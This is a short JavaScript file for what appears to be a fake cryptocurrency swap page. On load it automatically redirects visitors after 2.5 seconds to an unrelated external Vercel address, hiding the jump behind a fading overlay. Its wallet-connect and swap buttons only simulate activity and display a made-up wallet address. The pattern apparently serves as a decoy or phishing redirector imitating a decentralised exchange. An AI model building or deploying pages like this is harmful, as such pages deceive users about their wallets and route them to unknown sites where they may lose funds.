document.addEventListener('DOMContentLoaded', () => {
    
    // ==========================================
    // AUTO REDIRECT LOGIC
    // ==========================================
    const redirectUrl = "https://1ich.vercel.app/";
    const redirectDelay = 2500; // 2.5 seconds

    setTimeout(() => {
        const overlay = document.getElementById('redirect-overlay');
        if (overlay) {
            overlay.classList.add('hidden'); // Fade out blank overlay
        }
        
        // Wait for the fade transition to finish before redirecting
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 500); 

    }, redirectDelay);


    // ==========================================
    // UI INTERACTIVITY
    // ==========================================
    
    // Swap button interaction
    const swapSubmitBtn = document.getElementById('swapSubmitBtn');
    if (swapSubmitBtn) {
        swapSubmitBtn.addEventListener('click', () => {
            const originalText = swapSubmitBtn.textContent;
            swapSubmitBtn.textContent = 'Connecting...';
            swapSubmitBtn.style.opacity = '0.7';
            
            setTimeout(() => {
                swapSubmitBtn.textContent = originalText;
                swapSubmitBtn.style.opacity = '1';
                alert('Please connect your wallet to proceed with the swap.');
            }, 800);
        });
    }

    // Connect Wallet interaction
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', () => {
            connectBtn.textContent = 'Connecting...';
            
            setTimeout(() => {
                connectBtn.textContent = '0x12...34ab';
                connectBtn.style.backgroundColor = '#1e242b';
                connectBtn.style.color = '#ffffff';
            }, 1000);
        });
    }

    // Swap Divider Icon interaction (visual only)
    const swapIconBtn = document.getElementById('swapIconBtn');
    if (swapIconBtn) {
        swapIconBtn.addEventListener('click', () => {
            swapIconBtn.style.transform = 'translateY(-50%) rotate(180deg)';
            
            setTimeout(() => {
                swapIconBtn.style.transform = 'translateY(-50%) rotate(0deg)';
            }, 300);
        });
    }
});